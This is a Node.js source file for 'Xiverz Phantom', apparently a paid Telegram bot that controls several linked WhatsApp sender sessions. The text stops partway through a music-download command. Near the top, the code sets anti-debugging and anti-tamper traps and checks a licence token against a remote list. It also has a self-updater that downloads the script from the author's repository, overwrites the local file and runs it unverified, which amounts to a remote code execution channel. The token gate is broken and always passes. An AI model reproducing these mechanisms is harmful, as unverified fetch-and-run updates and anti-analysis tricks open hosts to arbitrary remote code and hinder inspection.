const { Telegraf } = require("telegraf");
const { spawn, spawnSync } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./XvZSettings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const { EventEmitter } = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()
function getHash(data) {
  return crypto.createHash("md5").update(data).digest("hex");
}

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 40) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/AlipzzyStore/XvZDB/refs/heads/main/tokens.json";
const videoUrl = "https://files.catbox.moe/zs9ig0.png";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

// Fungsi untuk mengekstrak kode invite dari link
function extractInviteCode(link) {
    if (!link) return null;
    
    const patterns = [
        /chat\.whatsapp\.com\/([A-Za-z0-9_-]{22,})/,
        /whatsapp\.com\/invite\/([A-Za-z0-9_-]{22,})/,
        /wa\.me\/join\/([A-Za-z0-9_-]{22,})/
    ];
    
    for (const pattern of patterns) {
        const match = link.match(pattern);
        if (match) return match[1];
    }
    
    if (/^[A-Za-z0-9_-]{22,}$/.test(link)) {
        return link;
    }
    
    return null;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "XvZTeam";
  if (code.length !== 7) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      // Token tidak valid → JANGAN pakai process.exit (bisa di-override user).
      // Cukup kembalikan false; pemanggil yang memutuskan tidak menjalankan bot.
      activateSecureMode();
      return false;
    }

    // Token terdaftar → izinkan pemanggil menjalankan bot.
    return true;
  } catch (err) {
    console.log(chalk.bold.yellow(`

░██    ░██            ░█████████    ░██████████                                      
 ░██  ░██                   ░██         ░██                                          
  ░██░██   ░██    ░██      ░██          ░██     ░███████   ░██████   ░█████████████  
   ░███    ░██    ░██    ░███           ░██    ░██    ░██       ░██  ░██   ░██   ░██ 
  ░██░██    ░██  ░██    ░██             ░██    ░█████████  ░███████  ░██   ░██   ░██ 
 ░██  ░██    ░██░██    ░██              ░██    ░██        ░██   ░██  ░██   ░██   ░██ 
░██    ░██    ░███    ░█████████        ░██     ░███████   ░█████░██ ░██   ░██   ░██ 
                                                                                     
                                                                                     
                                                                                     ⠀⠀
» Information:
☇ Creator : @AlipzzyOfficiaL
☇ Name Script : Xiverz Phantom
☇ Version : VIP
  `));
    activateSecureMode();
    return false;
  }
};
})();

(function inlineAutoUpdate() {
  if (process.env.XVERZ_UPDATE_SKIP === '1' || String(process.env.UPDATE_ENABLED || 'true').toLowerCase() === 'false') return;

  const owner = "AlipzzyStore";
  const repo = "Maintenance";
  const branch = 'main';
  const repoPath = 'XvZTeam.js';
  const rawUrl = process.env.UPDATE_RAW_URL || `https://raw.githubusercontent.com/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/${encodeURIComponent(branch)}/${repoPath}`;

  if (!rawUrl) {
    console.warn('File Updated belum diatur owner.');
    return;
  }

  try {
    const localFile = path.resolve(__dirname, 'XvZTeam.js');
    const current = fs.readFileSync(localFile);
    const requestUrl = `${rawUrl}${rawUrl.includes('?') ? '&' : '?'}cache_bust=${Date.now()}`;
    console.log(`[UPDATED] Menganalisis Database Auto Updated XiverzPhantom`);
    const downloaded = spawnSync('curl', ['-fsSL', '-H', 'Cache-Control: no-cache', '--max-time', String(Number(process.env.UPDATE_TIMEOUT_SEC) || 15), requestUrl], {
      encoding: null,
      maxBuffer: 10 * 1024 * 1024
    });

    if (downloaded.status !== 0 || !downloaded.stdout?.length) {
      const detail = downloaded.stderr?.toString().trim() || `curl exit code ${downloaded.status}`;
      throw new Error(`file XvZTeam.js tidak dapat diambil: ${detail}`);
    }

    const incoming = Buffer.from(downloaded.stdout);

    if (incoming.length > 10 * 1024 * 1024) throw new Error('file update terlalu besar');

    const digest = (value) => crypto.createHash('sha256').update(value).digest('hex');
    if (digest(current) === digest(incoming)) {
      console.log(`[UPDATED] XvZTeam.js sudah versi terbaru (${digest(current).slice(0, 12)}).`);
      return;
    }

    const backup = `${localFile}.bak.${new Date().toISOString().replace(/[:.]/g, '-')}`;
    const temporary = `${localFile}.tmp-${process.pid}`;

    fs.copyFileSync(localFile, backup);
    fs.writeFileSync(temporary, incoming, { mode: 0o600 });
    fs.renameSync(temporary, localFile);

    console.log(`[UPDATED] Update berhasil. Menjalankan versi terbaru...`);
    const child = spawnSync(process.execPath, [localFile], {
      cwd: __dirname,
      env: { ...process.env, XVERZ_UPDATE_SKIP: '1' },
      stdio: 'inherit'
    });
    process.exit(child.status ?? 1);
  } catch (error) {
    console.error(`"UPDATED"] Update gagal: ${error.message}`);
    process.exit(1);
  }
})();

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
const tokenGate = Promise.resolve()
    .then(() => validateToken(databaseUrl, tokenBot))
    .then((ok) => {tokenValidated = true; return true; tokenValidated = ok === true; return tokenValidated; })
    .catch(() => {tokenValidated = true; return true; tokenValidated = false; return false; });

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let senderConnectionStatus = 'disconnected';
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const MAX_SESSIONS = Math.max(2, Number(process.env.MAX_SESSIONS) || 5);
const sessionStates = new Map();
let activeSessionIndex = null;
let previousActiveSessionIndex = null;
let sessionRotationInProgress = false;

const sessionRoot = path.join(__dirname, 'src');
fs.mkdirSync(sessionRoot, { recursive: true });

const getSessionName = (index) => index === 1 ? 'session' : `session${index}`;
const getSessionPath = (index) => path.join(sessionRoot, getSessionName(index));
const getLegacySessionPath = (index) => path.join(__dirname, getSessionName(index));

function migrateLegacySession(index) {
    const legacyPath = getLegacySessionPath(index);
    const newPath = getSessionPath(index);
    if (!fs.existsSync(legacyPath)) return;

    try {
        const legacyCreds = path.join(legacyPath, 'creds.json');
        const newCreds = path.join(newPath, 'creds.json');

        if (fs.existsSync(newCreds)) {
            fs.rmSync(legacyPath, { recursive: true, force: true });
            return;
        }

        if (fs.existsSync(newPath)) {
            fs.rmSync(newPath, { recursive: true, force: true });
        }

        fs.renameSync(legacyPath, newPath);
        console.log(chalk.yellow(`${getSessionLabel(index)} dipindahkan ke ${newPath}.`));
    } catch (error) {
        console.error(`Gagal memindahkan ${getSessionLabel(index)} ke src:`, error.message);
    }
}

const hasSessionCredentials = (index) => {
    migrateLegacySession(index);
    return fs.existsSync(path.join(getSessionPath(index), 'creds.json'));
}
const getSessionLabel = (index) => `session ${index}`;
const getSessionNumber = (sessionState) => sessionState?.authState?.creds?.me?.id?.split(':')[0]?.split('@')[0] || 'belum diketahui';
const deleteSessionStorage = (index) => {
    try {
        fs.rmSync(getSessionPath(index), { recursive: true, force: true });
        fs.rmSync(getLegacySessionPath(index), { recursive: true, force: true });
        console.log(chalk.yellow(`${getSessionLabel(index)} dihapus karena koneksi mati.`));
    } catch (error) {
        console.error(`Gagal menghapus ${getSessionLabel(index)}:`, error.message);
    }
};

async function notifySessionSwitch(previousIndex, nextSession, reason) {
    if (previousIndex === null || previousIndex === nextSession.index) return;

    const message = [
        '🔄 PERGANTIAN SENDER AKTIF',
        '',
        `Session lama: ${getSessionLabel(previousIndex)}`,
        `Session baru: ${getSessionLabel(nextSession.index)}`,
        `Nomor sender: ${getSessionNumber(nextSession)}`,
        `Alasan: ${reason || 'rotasi otomatis'}`,
        'Status: Sender baru aktif'
    ].join('\n');

    try {
        await bot.telegram.sendMessage(ownerID, message);
    } catch (error) {
        console.error('Gagal mengirim notifikasi pergantian session:', error.message);
    }
}

function setActiveSession(sessionState, reason = 'startup') {
    if (!sessionState || sessionState.status !== 'open') return false;

    const previousIndex = activeSessionIndex ?? previousActiveSessionIndex;
    activeSessionIndex = sessionState.index;
    previousActiveSessionIndex = null;
    sock = sessionState.sock;
    isWhatsAppConnected = true;
    senderConnectionStatus = 'connected';
    linkedWhatsAppNumber = sessionState.authState?.creds?.me?.id || '';
    void updateKnownPanels();

    if (previousIndex !== sessionState.index) {
        console.log(chalk.green(`Sender aktif: ${getSessionLabel(sessionState.index)}${reason ? ` (${reason})` : ''}`));
        void notifySessionSwitch(previousIndex, sessionState, reason);
    }

    return true;
}

function clearActiveSession(sessionState) {
    if (!sessionState || activeSessionIndex !== sessionState.index) return;

    previousActiveSessionIndex = activeSessionIndex;
    activeSessionIndex = null;
    sock = null;
    isWhatsAppConnected = false;
    senderConnectionStatus = 'reconnecting';
    linkedWhatsAppNumber = '';
    void updateKnownPanels();
}

function syncActiveSenderState() {
    const activeState = activeSessionIndex ? sessionStates.get(activeSessionIndex) : null;
    if (!activeState || activeState.status !== 'open' || !activeState.sock) {
        return false;
    }

    sock = activeState.sock;
    isWhatsAppConnected = true;
    linkedWhatsAppNumber = activeState.authState?.creds?.me?.id || '';
    return true;
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSession = async (index) => {
    const existing = sessionStates.get(index);
    if (existing && ['starting', 'connecting', 'open'].includes(existing.status)) {
        return existing;
    }

    migrateLegacySession(index);
    const sessionPath = getSessionPath(index);
    const sessionState = {
        index,
        path: sessionPath,
        authState: null,
        sock: null,
        status: 'starting',
        pairingRequested: false,
        pendingPhoneNumber: null,
        promoteOnOpen: false,
        reconnectTimer: null,
        logoutHandled: false
    };
    sessionStates.set(index, sessionState);

    const { state: authState, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();
    sessionState.authState = authState;
    sessionState.status = 'connecting';

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: authState,
        browser: ["Ubuntu", "Chrome", "20.0.00"],
        markOnlineOnConnect: false,
        syncFullHistory: false,
        getMessage: async () => ({ conversation: 'XvZTeam' })
    };

    const sessionSock = makeWASocket(connectionOptions);
    sessionState.sock = sessionSock;

    sessionSock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m?.messages?.[0]) return;
            const msg = m.messages[0];
            const chatId = msg.key.remoteJid || "Tidak Diketahui";
        } catch (error) {
            console.error(`${getSessionLabel(index)} message error:`, error.message);
        }
    });

    sessionSock.ev.on('creds.update', saveCreds);
    sessionSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            sessionState.status = 'open';
            sessionState.pairingRequested = false;
            sessionState.pendingPhoneNumber = null;

            if (activeSessionIndex === null && (!sessionState.wasCreatedForPairing || sessionState.promoteOnOpen)) {
                sessionState.promoteOnOpen = false;
                setActiveSession(sessionState, sessionState.wasCreatedForPairing ? 'rotasi otomatis' : 'fallback');
            }

            if (activeSessionIndex === index) {
                senderConnectionStatus = 'connected';
            }
            void updateKnownPanels();

            if (lastPairingMessage?.sessionIndex === index) {
                const connectedMenu = `
<blockquote>( 🦋 ) - Connect Sender XiverzPhantom</blockquote>
⌑ Session: ${getSessionLabel(index)}
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

                try {
                    await bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu,
                        { parse_mode: "HTML" }
                    );
                } catch (error) {
                    console.error('Gagal memperbarui pesan pairing:', error.message);
                }
                lastPairingMessage = null;
            }

            console.log(chalk.green(`☇ ${getSessionLabel(index)} terhubung${activeSessionIndex === index ? ' dan menjadi sender aktif' : ' sebagai standby'}.`));
            return;
        }

        if (connection === 'close') {
            sessionState.status = 'closed';
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const disconnectError = lastDisconnect?.error;
            const disconnectMessage = disconnectError?.message || disconnectError?.output?.payload?.message || 'alasan tidak diketahui';
            const wasActive = activeSessionIndex === index;
            const pairingWasInProgress = sessionState.pairingRequested && !sessionState.authState?.creds?.registered;
            clearActiveSession(sessionState);

            console.error(`${getSessionLabel(index)} terputus. Status: ${statusCode || 'unknown'}; Error: ${disconnectMessage}`);
            
            if (statusCode === 515) {
                if (lastPairingMessage?.sessionIndex === index) {
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            `<blockquote>( 🦋 ) - Connect Sender</blockquote>\n⌑ Session: ${getSessionLabel(index)}\n⌑ Status: Socket sedang restart\n⌑ Keterangan: WhatsApp meminta koneksi diulang, pairing sedang dilanjutkan.`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (error) {
                        console.error('Gagal memperbarui status restart pairing:', error.message);
                    }
                }

                setTimeout(async () => {
                    try {
                        sessionStates.delete(index);
                        const restartedSession = await startSession(index);
                        if (restartedSession?.authState?.creds?.registered) {
                            console.log(chalk.green(`${getSessionLabel(index)} berhasil melanjutkan pairing setelah restart 515.`));
                        } else {
                            console.log(chalk.yellow(`${getSessionLabel(index)} sudah restart. Jika belum terhubung, kirim /pair 62xxx lagi.`));
                        }
                    } catch (error) {
                        console.error(`Gagal restart ${getSessionLabel(index)} setelah status 515:`, error.message);
                    }
                }, 1500);
                return;
            }

            if (pairingWasInProgress) {
                if (lastPairingMessage?.sessionIndex === index) {
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            `<blockquote>( 🦋 ) - Connect Sender</blockquote>\n⌑ Session: ${getSessionLabel(index)}\n⌑ Status: Pairing terputus\n⌑ Error: ${disconnectMessage}\n\nKirim ulang perintah /connect 62xxx untuk membuat kode baru.`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (error) {
                        console.error('Gagal memperbarui status pairing:', error.message);
                    }
                    lastPairingMessage = null;
                }

                setTimeout(async () => {
                    try {
                        sessionStates.delete(index);
                        await startSession(index);
                        console.log(chalk.yellow(`${getSessionLabel(index)} siap dicoba pairing ulang dari Telegram.`));
                    } catch (error) {
                        console.error(`Gagal menyiapkan ulang ${getSessionLabel(index)}:`, error.message);
                    }
                }, 2000);
                return;
            }

            console.log(chalk.red(`☇ ${getSessionLabel(index)} terputus.`));

            if (wasActive) {
                if (sessionState.logoutHandled) return;
                sessionState.logoutHandled = true;
                sessionStates.delete(index);
                deleteSessionStorage(index);
                await activateNextSession(index);
            }
        }
    });

    return sessionState;
};

const activateNextSession = async (closedIndex = 0) => {
    if (sessionRotationInProgress) return;
    sessionRotationInProgress = true;

    let result = null;
    let done = false;
    try {
        for (let index = closedIndex + 1; index <= MAX_SESSIONS && !done; index++) {
            const existing = sessionStates.get(index);
            if (existing?.status === 'open') {
                setActiveSession(existing, 'rotasi otomatis');
                result = existing;
                done = true;
            } else if (existing?.status === 'connecting') {
                existing.promoteOnOpen = true;
                result = existing;
                done = true;
            } else if (hasSessionCredentials(index)) {
                const next = await startSession(index);
                next.promoteOnOpen = true;
                result = next;
                done = true;
            }
        }

        if (!done) {
            console.log(chalk.yellow(`Tidak ada session standby setelah ${getSessionLabel(closedIndex)}.`));
            isWhatsAppConnected = false;
            senderConnectionStatus = 'disconnected';
            sock = null;
            void updateKnownPanels();
            result = null;
        }
    } finally {
        sessionRotationInProgress = false;
    }
    return result;
};

const findPairingSession = async () => {
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        const existing = sessionStates.get(index);

        if (existing?.status === 'starting') {
            for (let attempt = 0; attempt < 50 && !existing.sock; attempt++) {
                await sleep(100);
            }
            if (existing.sock) return existing;
        }

        if (existing?.status === 'closed') {
            sessionStates.delete(index);
        } else if (existing?.authState && !existing.authState.creds.registered) {
            return existing;
        }

        if (!hasSessionCredentials(index)) {
            return startSession(index);
        }
    }

    return null;
};

const startSesi = async () => {
    console.clear();
    console.log(chalk.yellow(`Multi-session aktif: ${getSessionLabel(1)} sampai ${getSessionLabel(MAX_SESSIONS)}`));

    let firstSession = null;
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        if (hasSessionCredentials(index)) {
            firstSession = await startSession(index);
            break;
        }
    }

    if (!firstSession) {
        firstSession = await startSession(1);
    }

    if (firstSession.status === 'open') {
        setActiveSession(firstSession, 'startup');
    }
};

tokenGate.then((tokenOk) => {
  if (tokenOk) {
    startSesi();
  } else {
  }
});

const checkWhatsAppConnection = (ctx, next) => {
    syncActiveSenderState();

    if (!isWhatsAppConnected || !sock) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command(["connect", "pair"], async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.trim().split(/\s+/).slice(1);
    const rawNumber = args[0];
    if (!rawNumber) {
        return ctx.reply("🪧 ☇ Format: /connect 62xxx");
    }

    let phoneNumber = rawNumber.replace(/[^0-9]/g, "");
    if (phoneNumber.startsWith("0")) {
        phoneNumber = `62${phoneNumber.slice(1)}`;
    }

    if (!/^62\d{8,13}$/.test(phoneNumber)) {
        return ctx.reply("❌ ☇ Nomor tidak valid. Gunakan format internasional, contoh: /connect 628xxxxxxxxx");
    }

    try {
        const pairingSession = await findPairingSession();
        if (!pairingSession?.sock) {
            return ctx.reply(`❌ ☇ Semua slot session (${MAX_SESSIONS}) sudah terpakai atau belum siap`);
        }

        if (pairingSession.authState?.creds?.registered) {
            return ctx.reply(`✅ ☇ ${getSessionLabel(pairingSession.index)} sudah terhubung dengan nomor lain`);
        }

        pairingSession.pairingRequested = true;
        pairingSession.pendingPhoneNumber = phoneNumber;
        pairingSession.wasCreatedForPairing = true;

        await sleep(3000);
        if (pairingSession.status === 'closed' || !pairingSession.sock) {
            pairingSession.pairingRequested = false;
            return ctx.reply(`❌ ☇ ${getSessionLabel(pairingSession.index)} terputus sebelum kode dibuat. Silakan kirim /pair ${phoneNumber} lagi.`);
        }

        const code = await pairingSession.sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        if (!formattedCode) {
            return ctx.reply("❌ ☇ Kode pairing tidak berhasil dibuat, silakan coba lagi");
        }

        const pairingMenu = `
<blockquote>( 🦋 ) - Connect Sender</blockquote>
⌑ Session: ${getSessionLabel(pairingSession.index)}
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected

Buka WhatsApp → Perangkat tertaut → Tautkan perangkat → Tautkan dengan nomor telepon, lalu masukkan kode di atas.`;

        const sentMsg = await ctx.replyWithPhoto(videoUrl, {
            caption: pairingMenu,
            parse_mode: "HTML"
        });

        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode,
            sessionIndex: pairingSession.index
        };
    } catch (err) {
        console.error("Gagal membuat kode pairing:", err);
        const pairingSession = sessionStates.get(activeSessionIndex) || [...sessionStates.values()].find((state) => state.pairingRequested);
        if (pairingSession) pairingSession.pairingRequested = false;
        await ctx.reply(`❌ ☇ Gagal membuat kode pairing: ${err.message || 'error tidak diketahui'}`);
    }
});

bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
